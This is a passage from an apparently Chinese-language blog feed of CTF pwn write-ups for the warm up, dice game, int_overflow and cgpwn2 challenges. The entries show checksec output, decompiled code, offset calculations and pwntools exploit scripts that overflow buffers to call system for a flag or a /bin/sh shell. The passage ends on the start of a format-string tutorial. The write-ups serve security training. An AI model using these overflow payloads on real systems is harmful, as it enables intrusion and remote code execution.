pwn import *</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,39675)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*0x44 + p32(0x080486CC) + <span class="string">'a'</span>*0x20 + p32(0x8)</span><br><span class="line"></span><br><span class="line"><span class="comment">#利用缓冲区溢出把函数指针v12 覆盖为地址0x080486cc,接下来再控制v14的值为10， 那么 &amp;v3+ --v14 便会指向</span></span><br><span class="line"><span class="comment">#v12，随后cat flag</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"bbb"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td
      
    
    </summary>
    
      <category term="攻防世界" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>warm up</title>
    <link href="http://yoursite.com/2019/07/27/warmup/"/>
    <id>http://yoursite.com/2019/07/27/warmup/</id>
    <published>2019-07-27T10:52:55.882Z</published>
    <updated>2019-07-27T11:01:02.587Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ checksec warmup</span><br><span class="line"></span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/warmup'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">只开启了nx保护</span><br><span class="line"></span><br><span class="line">ida分析</span><br><span class="line"></span><br><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [rsp+0h] [rbp-80h]</span><br><span class="line">  char v5; // [rsp+40h] [rbp-40h]</span><br><span class="line"></span><br><span class="line">  write(1, <span class="string">"-Warm Up-\n"</span>, 0xAuLL);</span><br><span class="line">  write(1, <span class="string">"WOW:"</span>, 4uLL);</span><br><span class="line">  sprintf(&amp;s, <span class="string">"%p\n"</span>, sub_40060D);</span><br><span class="line">  write(1, &amp;s, 9uLL);</span><br><span class="line">  write(1, <span class="string">"&gt;"</span>, 1uLL);</span><br><span class="line">  <span class="built_in">return</span> gets(&amp;v5, <span class="string">"&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gets(&amp;v5, <span class="string">"&gt;"</span>);  栈溢出漏洞利用</span><br><span class="line"></span><br><span class="line">int sub_40060D()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">return</span> system(<span class="string">"cat flag.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">system函数</span><br><span class="line"></span><br><span class="line">-0000000000000040 var_40          db ?</span><br><span class="line">-000000000000003F                 db ? ; undefined</span><br><span class="line">-000000000000003E                 db ? ; undefined</span><br><span class="line">-000000000000003D                 db ? ; undefined</span><br><span class="line">-000000000000003C                 db ? ; undefined</span><br><span class="line">-000000000000003B                 db ? ; undefined</span><br><span class="line">-000000000000003A                 db ? ; undefined</span><br><span class="line">-0000000000000039                 db ? ; undefined</span><br><span class="line">-0000000000000038                 db ? ; undefined</span><br><span class="line">-0000000000000037                 db ? ; undefined</span><br><span class="line">-0000000000000036                 db ? ; undefined</span><br><span class="line">-0000000000000035                 db ? ; undefined</span><br><span class="line">-0000000000000034                 db ? ; undefined</span><br><span class="line"></span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br><span class="line"></span><br><span class="line">覆盖v5只需要0x48个字节就可以了</span><br></pre></td></tr></table></figure><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用栈溢出覆盖gets中的v5，写入system函数的地址即可</span><br></pre></td></tr></table></figure><h3 id="0x03-攻击"><a href="#0x03-攻击" class="headerlink" title="0x03 攻击"></a>0x03 攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">非常简单的64位栈溢出</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,41315)</span><br><span class="line">sys_addr = 0x000000000040060D</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*0x40+<span class="string">'a'</span>*8+p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td
      
    
    </summary>
    
      <category term="攻防世界" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>dice game</title>
    <link href="http://yoursite.com/2019/07/27/dice%20game/"/>
    <id>http://yoursite.com/2019/07/27/dice game/</id>
    <published>2019-07-27T07:43:54.429Z</published>
    <updated>2019-07-27T10:50:32.062Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目考察的是：rand()生成的随机数和随机种子seed()有关，通过观察题目，可以发现存在溢出漏洞，通过输入可以覆盖到seed(),实现一个可预测的随机数列。</span><br><span class="line"></span><br><span class="line">ida分析</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190508145639641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDI5MDgx,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buf覆盖0x40位就能覆盖到seed</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2019050814583223.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDI5MDgx,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub_A20()如下，就是比较你输入的数是否和产生的随机数相等</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2019050814592433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDI5MDgx,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当回答正确50次时，会执行sub_B28这个函数，读取flag。</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190508150044523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDI5MDgx,size_16,color_FFFFFF,t_70" alt></p><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">所以我们要做的就是，将seed覆盖掉，并且去预测生成的随机数。</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,56942)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">asm =[2,5,4,2,6,2,5,1,4,2,3,2,3,2,6,5,1,1,5,5,6,3,4,4,3,3,3,2,2,2,6,1,1,1,6,4,2,5,2,5,4,4,4,6,3,2,3,3,6,1]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span>*0x40 + p64(0)</span><br><span class="line">p.recvuntil(<span class="string">"know your name: "</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> asm:</span><br><span class="line">        p.recvuntil(<span class="string">"Give me the point(1~6): "</span>)</span><br><span class="line">        p.send(str(x) + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">### 产生随机数的脚本</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt; </span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int <span class="function"><span class="title">main</span></span>()&#123;</span><br><span class="line">  srand(0);  <span class="comment">##切记一定是0 ，第一次尝试错误了  没有将种子设置为0</span></span><br><span class="line">  <span class="keyword">for</span>(int i=0;i&lt;50;i++)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d,"</span>,rand()%6 +1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td
      
    
    </summary>
    
      <category term="攻防世界" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>int_overflow</title>
    <link href="http://yoursite.com/2019/07/27/int_overflow/"/>
    <id>http://yoursite.com/2019/07/27/int_overflow/</id>
    <published>2019-07-27T07:04:06.396Z</published>
    <updated>2019-07-27T07:41:43.015Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ checksec int_overflow</span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/int_overflow'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">只开启了nx保护</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/xfgg/xfgg.github.io/master/images/int_overflow1.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span> 函数处可以进行溢出，但是需要经过 check_passwd 函数才能将跳出login。现在再看一下 check_passwd 函数内部，</span><br></pre></td></tr></table></figure><p><img src="https://github.com/xfgg/xfgg.github.io/blob/master/images/int_overflow2.png?raw=true" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v3 = strlen(s);造成整数溢出的一个点，我们再看一下此处的汇编代码。</span><br></pre></td></tr></table></figure><p><img src="https://github.com/xfgg/xfgg.github.io/blob/master/images/int_overflow3.png?raw=true" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call strlen 之后 返回值放在了al寄存器中，这是一个八位的积存器，也就是说如果 s 字符串的长度 大于255 就会造成 整数溢出。 再加上四字节就可以溢出</span><br></pre></td></tr></table></figure><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我们需要进到<span class="keyword">else</span>里，将 <span class="built_in">read</span> 读进来的 s 复制到 dest 中，是一个可以利用的栈溢出。</span><br><span class="line">现在我们知道了可以通过整数溢出到达 栈溢出漏洞，修改程序执行流，使程序跳转到 what_is_this 中。</span><br></pre></td></tr></table></figure><h3 id="0x03-攻击"><a href="#0x03-攻击" class="headerlink" title="0x03 攻击"></a>0x03 攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">栈溢出漏洞 加一个整数漏洞</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,44825)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"choice:"</span>,<span class="string">"1"</span>) </span><br><span class="line">p.sendlineafter(<span class="string">"username:\n"</span>,<span class="string">"2"</span>)</span><br><span class="line">sys_addr = 0x0804868b</span><br><span class="line">payload = <span class="string">'a'</span>*0x14+<span class="string">'a'</span>*4+p32(sys_addr)</span><br><span class="line">payload = payload.ljust(259,<span class="string">"A"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"passwd:\n"</span>,payload) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td
      
    
    </summary>
    
      <category term="攻防世界" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>cgpwn2</title>
    <link href="http://yoursite.com/2019/07/27/cgpwn2/"/>
    <id>http://yoursite.com/2019/07/27/cgpwn2/</id>
    <published>2019-07-27T06:48:01.768Z</published>
    <updated>2019-07-27T07:02:13.784Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ checksec cgpwn2</span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/cgpwn2'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">   只开启了nx保护</span><br><span class="line"></span><br><span class="line"> ida分析</span><br><span class="line"> char *hello()</span><br><span class="line">&#123;</span><br><span class="line">  char *v0; // eax</span><br><span class="line">  signed int v1; // ebx</span><br><span class="line">  unsigned int v2; // ecx</span><br><span class="line">  char *v3; // eax</span><br><span class="line">  char s; // [esp+12h] [ebp-26h]</span><br><span class="line">  int v6; // [esp+14h] [ebp-24h]</span><br><span class="line"></span><br><span class="line">  v0 = &amp;s;</span><br><span class="line">  v1 = 30;</span><br><span class="line">  <span class="keyword">if</span> ( (unsigned int)&amp;s &amp; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)&amp;s = 0;</span><br><span class="line">    v0 = (char *)&amp;v6;</span><br><span class="line">    v1 = 28;</span><br><span class="line">  &#125;</span><br><span class="line">  v2 = 0;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)&amp;v0[v2] = 0;</span><br><span class="line">    v2 += 4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v2 &lt; (v1 &amp; 0xFFFFFFFC) );</span><br><span class="line">  v3 = &amp;v0[v2];</span><br><span class="line">  <span class="keyword">if</span> ( v1 &amp; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)v3 = 0;</span><br><span class="line">    v3 += 2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &amp; 1 )</span><br><span class="line">    *v3 = 0;</span><br><span class="line">  puts(<span class="string">"please tell me your name"</span>);</span><br><span class="line">  fgets(name, 50, stdin);</span><br><span class="line">  puts(<span class="string">"hello,you can leave some message here:"</span>);</span><br><span class="line">  <span class="built_in">return</span> gets(&amp;s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fgets(name, 50, stdin); 栈溢出漏洞</span><br><span class="line"></span><br><span class="line">.bss:0804A080 name            db 34h dup(?)           ; DATA XREF: hello+77↑o</span><br><span class="line">.bss:0804A080 _bss            ends</span><br><span class="line">.bss:0804A080</span><br><span class="line"></span><br><span class="line">name 在bss段可以写入/bin/sh</span><br><span class="line"></span><br><span class="line">int pwn()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">return</span> system(<span class="string">"echo hehehe"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">有system但是没有/bin/sh 需要自己写入</span><br><span class="line"></span><br><span class="line">00000026 s               db ?</span><br><span class="line">-00000025                 db ? ; undefined</span><br><span class="line">-00000024                 db ? ; undefined</span><br><span class="line">-00000023                 db ? ; undefined</span><br><span class="line">.................</span><br><span class="line">00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line"></span><br><span class="line">溢出字节位42字节</span><br></pre></td></tr></table></figure><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在找关键字符串的时候没有发现 bin/sh 。所以我们需要将bin/sh写到我们可以访问的地址中去。我们可以在输入name的时候把 bin/sh写进去。name位于bss段，bss段保存全局变量，加载地址不会因为地址随机化的开启而有所变化。</span><br><span class="line"></span><br><span class="line">将 system 的地址写到 hello 函数的返回地址中，同时将之前 bin/sh 的地址也写到栈中，作为system函数的参数</span><br></pre></td></tr></table></figure><h3 id="0x03-攻击"><a href="#0x03-攻击" class="headerlink" title="0x03 攻击"></a>0x03 攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">普通的栈溢出攻击 有system但是没有/bin/sh</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=remote(<span class="string">'111.198.29.45'</span>,48164)</span><br><span class="line">bin_sh_addr=0x0804A080</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">system_addr=0x08048420</span><br><span class="line">payload=<span class="string">'a'</span>*0x26+<span class="string">'a'</span>*4+p32(system_addr)+p32(system_addr)+p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td
      
    
    </summary>
    
      <category term="攻防世界" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串漏洞</title>
    <link href="http://yoursite.com/2019/07/27/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6/"/>
    <id>http://yoursite.com/2019/07/27/格式化字符/</id>
    <published>2019-07-27T06:44:31.439Z</published>
    <updated>2019-07-27T06:44:15.991Z</updated>
    
    <content type="html"><![CDATA[<h3 id="格式化字符串漏洞基本原理"><a href="#格式化字符串漏洞基本原理" class="headerlink" title="格式化字符串漏洞基本原理"></a>格式化字符串漏洞基本原理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">格式化字符串漏洞在通用漏洞类型库CWE中的编号是134，其解释为“软件使用了格式化字符串作为参数，且该格式化字符串来自外部输入”。会触发该漏洞的函数很有限，主要就是<span class="built_in">printf</span>、sprintf、fprintf等<span class="built_in">print</span>家族函数。介绍格式化字符串原理的文章有很多，我这里就以<span class="built_in">printf</span>函数为例，简单回顾其中的要点。</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>()函数的一般形式为<span class="built_in">printf</span>(<span class="string">"format"</span>, 输出表列)，其第一个参数就是格式化字符串，用来告诉程序以什么格式进行输出。正常情况下，我们是这样使用的：</span><br><span class="line"></span><br><span class="line">char str[100];</span><br><span class="line">scanf(<span class="string">"%s"</span>,str);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>,str);</span><br><span class="line">但也会有人这么用：</span><br><span class="line"></span><br><span class="line">char str[100];</span><br><span class="line">scanf(<span class="string">"%s"</span>,str);</span><br><span class="line"><span class="built_in">printf</span>(str)</span><br><span class="line">也许代码编写者的本意只是单纯打印一段字符（如“hello world”），但如果这段字符串来源于外部用户可控的输入，则该用户完全可以在字符串中嵌入格式化字符（如%s）。那么，由于<span class="built_in">printf</span>允许参数个数不固定，故<span class="built_in">printf</span>会自动将这段字符当作format参数，而用其后内存中的数据匹配format参数。</span><br></pre></td></tr></table></figure><p><img src="http://p2.qhimg.com/t0199b46dc9f9480f6f.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">以上图为例，假设调用<span class="built_in">printf</span>(str)时的栈是这样的。</span><br><span class="line"></span><br><span class="line">1）如str就是“hello world”，则直接输出“hello world”；</span><br><span class="line"></span><br><span class="line">2）如str是format，比如是%2<span class="variable">$x</span>，则输出偏移2处的16进制数据0xdeadbeef。</span><br><span class="line"></span><br><span class="line">通过组合变换格式化字符串参数，我们可以读取任意偏移处的数据或向任意偏移处写数据，从而达到利用格式化字符串漏洞的作用。</span><br></pre></td></tr></table></figure><h3 